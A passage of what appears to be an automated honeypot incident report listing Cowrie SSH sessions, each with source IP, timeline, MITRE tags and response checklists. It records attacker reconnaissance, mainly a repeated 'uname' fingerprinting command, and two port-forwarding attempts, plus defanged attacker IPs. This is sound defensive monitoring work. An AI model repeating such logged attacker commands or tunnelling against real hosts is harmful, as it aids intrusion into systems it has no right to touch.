| `2026-08-08 00:57:49` | `cowrie.session.connect` |
| `2026-08-08 00:57:49` | `cowrie.client.version` |
| `2026-08-08 00:57:49` | `cowrie.client.kex` |
| `2026-08-08 00:57:50` | `cowrie.login.success` |
| `2026-08-08 00:57:51` | `cowrie.session.params` |
| `2026-08-08 00:57:51` | `cowrie.command.input` |
| `2026-08-08 00:57:51` | `cowrie.log.closed` |
| `2026-08-08 00:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ebacaf40a86

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:57 |
| **Last Seen** | 2026-08-08 00:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:57:55` | `cowrie.session.connect` |
| `2026-08-08 00:57:55` | `cowrie.client.version` |
| `2026-08-08 00:57:55` | `cowrie.client.kex` |
| `2026-08-08 00:57:55` | `cowrie.login.success` |
| `2026-08-08 00:57:56` | `cowrie.session.params` |
| `2026-08-08 00:57:56` | `cowrie.command.input` |
| `2026-08-08 00:57:56` | `cowrie.log.closed` |
| `2026-08-08 00:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1e3aa2f2d25

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:00` | `cowrie.session.connect` |
| `2026-08-08 00:58:00` | `cowrie.client.version` |
| `2026-08-08 00:58:00` | `cowrie.client.kex` |
| `2026-08-08 00:58:00` | `cowrie.login.success` |
| `2026-08-08 00:58:01` | `cowrie.session.params` |
| `2026-08-08 00:58:01` | `cowrie.command.input` |
| `2026-08-08 00:58:01` | `cowrie.log.closed` |
| `2026-08-08 00:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3c0a5c272d1

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:05` | `cowrie.session.connect` |
| `2026-08-08 00:58:05` | `cowrie.client.version` |
| `2026-08-08 00:58:05` | `cowrie.client.kex` |
| `2026-08-08 00:58:05` | `cowrie.login.success` |
| `2026-08-08 00:58:06` | `cowrie.session.params` |
| `2026-08-08 00:58:06` | `cowrie.command.input` |
| `2026-08-08 00:58:06` | `cowrie.log.closed` |
| `2026-08-08 00:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f7b96ba8689

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:10` | `cowrie.session.connect` |
| `2026-08-08 00:58:10` | `cowrie.client.version` |
| `2026-08-08 00:58:10` | `cowrie.client.kex` |
| `2026-08-08 00:58:11` | `cowrie.login.success` |
| `2026-08-08 00:58:11` | `cowrie.session.params` |
| `2026-08-08 00:58:11` | `cowrie.command.input` |
| `2026-08-08 00:58:12` | `cowrie.log.closed` |
| `2026-08-08 00:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-015206cac0ce

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:16` | `cowrie.session.connect` |
| `2026-08-08 00:58:16` | `cowrie.client.version` |
| `2026-08-08 00:58:16` | `cowrie.client.kex` |
| `2026-08-08 00:58:16` | `cowrie.login.success` |
| `2026-08-08 00:58:17` | `cowrie.session.params` |
| `2026-08-08 00:58:17` | `cowrie.command.input` |
| `2026-08-08 00:58:17` | `cowrie.log.closed` |
| `2026-08-08 00:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85948ea7382e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:21` | `cowrie.session.connect` |
| `2026-08-08 00:58:21` | `cowrie.client.version` |
| `2026-08-08 00:58:21` | `cowrie.client.kex` |
| `2026-08-08 00:58:21` | `cowrie.login.success` |
| `2026-08-08 00:58:22` | `cowrie.session.params` |
| `2026-08-08 00:58:22` | `cowrie.command.input` |
| `2026-08-08 00:58:22` | `cowrie.log.closed` |
| `2026-08-08 00:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eb398b5a3e1

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:26` | `cowrie.session.connect` |
| `2026-08-08 00:58:26` | `cowrie.client.version` |
| `2026-08-08 00:58:26` | `cowrie.client.kex` |
| `2026-08-08 00:58:27` | `cowrie.login.success` |
| `2026-08-08 00:58:28` | `cowrie.session.params` |
| `2026-08-08 00:58:28` | `cowrie.command.input` |
| `2026-08-08 00:58:28` | `cowrie.log.closed` |
| `2026-08-08 00:58:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b073aaf285e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:32` | `cowrie.session.connect` |
| `2026-08-08 00:58:32` | `cowrie.client.version` |
| `2026-08-08 00:58:32` | `cowrie.client.kex` |
| `2026-08-08 00:58:32` | `cowrie.login.success` |
| `2026-08-08 00:58:33` | `cowrie.session.params` |
| `2026-08-08 00:58:33` | `cowrie.command.input` |
| `2026-08-08 00:58:33` | `cowrie.log.closed` |
| `2026-08-08 00:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b911e1479b17

| Field | Detail |
|---|---|
| **Source IP** | `27.107.102[.]154` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:33` | `cowrie.session.connect` |
| `2026-08-08 00:58:33` | `cowrie.client.version` |
| `2026-08-08 00:58:33` | `cowrie.client.kex` |
| `2026-08-08 00:58:35` | `cowrie.login.success` |
| `2026-08-08 00:58:35` | `cowrie.direct-tcpip.request` |
| `2026-08-08 00:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.107.102[.]154` to AbuseIPDB if not already reported
- [ ] Block `27.107.102[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e866a8da6f0

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:37` | `cowrie.session.connect` |
| `2026-08-08 00:58:37` | `cowrie.client.version` |
| `2026-08-08 00:58:37` | `cowrie.client.kex` |
| `2026-08-08 00:58:37` | `cowrie.login.success` |
| `2026-08-08 00:58:38` | `cowrie.session.params` |
| `2026-08-08 00:58:38` | `cowrie.command.input` |
| `2026-08-08 00:58:38` | `cowrie.log.closed` |
| `2026-08-08 00:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46f0de45a9e6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:39` | `cowrie.session.connect` |
| `2026-08-08 00:58:39` | `cowrie.client.version` |
| `2026-08-08 00:58:39` | `cowrie.client.kex` |
| `2026-08-08 00:58:39` | `cowrie.login.success` |
| `2026-08-08 00:58:40` | `cowrie.session.params` |
| `2026-08-08 00:58:40` | `cowrie.command.input` |
| `2026-08-08 00:58:40` | `cowrie.log.closed` |
| `2026-08-08 00:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da39a2ef6d17

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:42` | `cowrie.session.connect` |
| `2026-08-08 00:58:42` | `cowrie.client.version` |
| `2026-08-08 00:58:42` | `cowrie.client.kex` |
| `2026-08-08 00:58:43` | `cowrie.login.success` |
| `2026-08-08 00:58:43` | `cowrie.session.params` |
| `2026-08-08 00:58:43` | `cowrie.command.input` |
| `2026-08-08 00:58:43` | `cowrie.log.closed` |
| `2026-08-08 00:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bee3e5453c8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:47` | `cowrie.session.connect` |
| `2026-08-08 00:58:47` | `cowrie.client.version` |
| `2026-08-08 00:58:48` | `cowrie.client.kex` |
| `2026-08-08 00:58:48` | `cowrie.login.success` |
| `2026-08-08 00:58:49` | `cowrie.session.params` |
| `2026-08-08 00:58:49` | `cowrie.command.input` |
| `2026-08-08 00:58:49` | `cowrie.log.closed` |
| `2026-08-08 00:58:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50efb128276a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:53` | `cowrie.session.connect` |
| `2026-08-08 00:58:53` | `cowrie.client.version` |
| `2026-08-08 00:58:53` | `cowrie.client.kex` |
| `2026-08-08 00:58:53` | `cowrie.login.success` |
| `2026-08-08 00:58:54` | `cowrie.session.params` |
| `2026-08-08 00:58:54` | `cowrie.command.input` |
| `2026-08-08 00:58:54` | `cowrie.log.closed` |
| `2026-08-08 00:58:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-374221739999

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:58 |
| **Last Seen** | 2026-08-08 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:58:58` | `cowrie.session.connect` |
| `2026-08-08 00:58:58` | `cowrie.client.version` |
| `2026-08-08 00:58:58` | `cowrie.client.kex` |
| `2026-08-08 00:58:58` | `cowrie.login.success` |
| `2026-08-08 00:58:59` | `cowrie.session.params` |
| `2026-08-08 00:58:59` | `cowrie.command.input` |
| `2026-08-08 00:58:59` | `cowrie.log.closed` |
| `2026-08-08 00:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d1455f5ebd7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:59 |
| **Last Seen** | 2026-08-08 00:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:59:04` | `cowrie.session.connect` |
| `2026-08-08 00:59:04` | `cowrie.client.version` |
| `2026-08-08 00:59:04` | `cowrie.client.kex` |
| `2026-08-08 00:59:04` | `cowrie.login.success` |
| `2026-08-08 00:59:05` | `cowrie.session.params` |
| `2026-08-08 00:59:05` | `cowrie.command.input` |
| `2026-08-08 00:59:05` | `cowrie.log.closed` |
| `2026-08-08 00:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d5939133fad

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:59 |
| **Last Seen** | 2026-08-08 00:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:59:09` | `cowrie.session.connect` |
| `2026-08-08 00:59:09` | `cowrie.client.version` |
| `2026-08-08 00:59:09` | `cowrie.client.kex` |
| `2026-08-08 00:59:09` | `cowrie.login.success` |
| `2026-08-08 00:59:10` | `cowrie.session.params` |
| `2026-08-08 00:59:10` | `cowrie.command.input` |
| `2026-08-08 00:59:11` | `cowrie.log.closed` |
| `2026-08-08 00:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a15d1144e96

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:59 |
| **Last Seen** | 2026-08-08 00:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:59:14` | `cowrie.session.connect` |
| `2026-08-08 00:59:14` | `cowrie.client.version` |
| `2026-08-08 00:59:14` | `cowrie.client.kex` |
| `2026-08-08 00:59:15` | `cowrie.login.success` |
| `2026-08-08 00:59:15` | `cowrie.session.params` |
| `2026-08-08 00:59:15` | `cowrie.command.input` |
| `2026-08-08 00:59:15` | `cowrie.log.closed` |
| `2026-08-08 00:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b402992315e1

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:59 |
| **Last Seen** | 2026-08-08 00:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:59:20` | `cowrie.session.connect` |
| `2026-08-08 00:59:20` | `cowrie.client.version` |
| `2026-08-08 00:59:20` | `cowrie.client.kex` |
| `2026-08-08 00:59:20` | `cowrie.login.success` |
| `2026-08-08 00:59:21` | `cowrie.session.params` |
| `2026-08-08 00:59:21` | `cowrie.command.input` |
| `2026-08-08 00:59:21` | `cowrie.log.closed` |
| `2026-08-08 00:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0851473a1251

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:59 |
| **Last Seen** | 2026-08-08 00:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:59:25` | `cowrie.session.connect` |
| `2026-08-08 00:59:25` | `cowrie.client.version` |
| `2026-08-08 00:59:25` | `cowrie.client.kex` |
| `2026-08-08 00:59:25` | `cowrie.login.success` |
| `2026-08-08 00:59:26` | `cowrie.session.params` |
| `2026-08-08 00:59:26` | `cowrie.command.input` |
| `2026-08-08 00:59:26` | `cowrie.log.closed` |
| `2026-08-08 00:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc7df5a9a020

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:59 |
| **Last Seen** | 2026-08-08 00:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:59:30` | `cowrie.session.connect` |
| `2026-08-08 00:59:30` | `cowrie.client.version` |
| `2026-08-08 00:59:30` | `cowrie.client.kex` |
| `2026-08-08 00:59:31` | `cowrie.login.success` |
| `2026-08-08 00:59:31` | `cowrie.session.params` |
| `2026-08-08 00:59:31` | `cowrie.command.input` |
| `2026-08-08 00:59:31` | `cowrie.log.closed` |
| `2026-08-08 00:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5af72cf205c

| Field | Detail |
|---|---|
| **Source IP** | `185.255.212[.]178` |
| **First Seen** | 2026-08-08 00:59 |
| **Last Seen** | 2026-08-08 00:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:59:31` | `cowrie.session.connect` |
| `2026-08-08 00:59:32` | `cowrie.client.version` |
| `2026-08-08 00:59:32` | `cowrie.client.kex` |
| `2026-08-08 00:59:33` | `cowrie.login.success` |
| `2026-08-08 00:59:33` | `cowrie.direct-tcpip.request` |
| `2026-08-08 00:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.255.212[.]178` to AbuseIPDB if not already reported
- [ ] Block `185.255.212[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87492d8cf43c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:59 |
| **Last Seen** | 2026-08-08 00:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:59:36` | `cowrie.session.connect` |
| `2026-08-08 00:59:36` | `cowrie.client.version` |
| `2026-08-08 00:59:36` | `cowrie.client.kex` |
| `2026-08-08 00:59:36` | `cowrie.login.success` |
| `2026-08-08 00:59:37` | `cowrie.session.params` |
| `2026-08-08 00:59:37` | `cowrie.command.input` |
| `2026-08-08 00:59:37` | `cowrie.log.closed` |
| `2026-08-08 00:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d10d534650a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:59 |
| **Last Seen** | 2026-08-08 00:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:59:41` | `cowrie.session.connect` |
| `2026-08-08 00:59:41` | `cowrie.client.version` |
| `2026-08-08 00:59:41` | `cowrie.client.kex` |
| `2026-08-08 00:59:41` | `cowrie.login.success` |
| `2026-08-08 00:59:42` | `cowrie.session.params` |
| `2026-08-08 00:59:42` | `cowrie.command.input` |
| `2026-08-08 00:59:42` | `cowrie.log.closed` |
| `2026-08-08 00:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26d83ba70686

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:59 |
| **Last Seen** | 2026-08-08 00:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:59:46` | `cowrie.session.connect` |
| `2026-08-08 00:59:46` | `cowrie.client.version` |
| `2026-08-08 00:59:46` | `cowrie.client.kex` |
| `2026-08-08 00:59:47` | `cowrie.login.success` |
| `2026-08-08 00:59:48` | `cowrie.session.params` |
| `2026-08-08 00:59:48` | `cowrie.command.input` |
| `2026-08-08 00:59:48` | `cowrie.log.closed` |
| `2026-08-08 00:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6299e2eabd38

| Field | Detail |
|---|---|
